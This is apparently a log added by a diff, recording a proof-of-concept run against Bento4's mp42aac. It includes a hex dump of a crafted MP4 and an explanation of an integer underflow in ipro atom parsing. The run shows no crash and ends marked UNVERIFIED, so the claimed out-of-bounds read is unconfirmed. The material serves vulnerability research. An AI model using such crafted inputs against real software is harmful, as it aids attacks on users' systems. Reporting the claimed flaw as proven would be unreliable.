@@ -1,0 +1,44 @@
+=== VULN 001 PoC Runner ===
+Target: /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac
+Input:  /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IproAtom_cpp/vuln_001.mp4
+
+[*] Generating crafted MP4...
+[+] PoC written: /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IproAtom_cpp/vuln_001.mp4
+[+] File size: 178 bytes
+
+[+] Vulnerability trigger:
+    ipro.size = 12  (passes 'size < 12' guard in Create())
+    bytes_available = 12 - 12 - 2 = 0xFFFFFFFE  (AP4_UI32 underflow)
+    ReadUI16(entry_count) reads 2 bytes OUTSIDE ipro boundary
+    entry_count=1 → CreateAtomFromStream(stream, 0xFFFFFFFE, atom)
+    Sub-atom 'free'(size=8) parsed outside ipro's declared bounds
+
+[*] Input file: -rw-rw-r-- 1 yuelinwang yuelinwang 178 Sep  7 17:18 /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IproAtom_cpp/vuln_001.mp4
+[*] File hex dump:
+00000000: 0000 0018 6674 7970 6d70 3432 0000 0000  ....ftypmp42....
+00000010: 6d70 3432 6973 6f6d 0000 0092 6d6f 6f76  mp42isom....moov
+00000020: 0000 006c 6d76 6864 0000 0000 0000 0000  ...lmvhd........
+00000030: 0000 0000 0000 03e8 0000 0000 0001 0000  ................
+00000040: 0100 0000 0000 0000 0000 0000 0001 0000  ................
+00000050: 0000 0000 0000 0000 0000 0000 0001 0000  ................
+00000060: 0000 0000 0000 0000 0000 0000 4000 0000  ............@...
+00000070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
+00000080: 0000 0000 0000 0000 0000 0001 0000 001e  ................
+00000090: 7564 7461 0000 000c 6970 726f 0000 0000  udta....ipro....
+000000a0: 0001 0000 0008 6672 6565 0000 0008 6d64  ......free....md
+000000b0: 6174                                     at
+
+[*] Running mp42aac with ASAN+UBSAN...
+ERROR: no audio track found
+
+[*] Exit code: 0
+[*] Checking for ASAN/UBSAN error logs...
+[*] No ASAN log files found (or all empty) at /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4IproAtom_cpp/asan.log.*
+
+[*] Checking for sanitizer/crash indicators...
+[*] No ASAN/UBSAN/crash indicator detected. The logical OOB occurred but
+    was not caught by the memory sanitizer (file-backed stream uses fread,
+    which does not expose memory pointers that ASAN can track).
+
+=== STATUS: UNVERIFIED ===
+
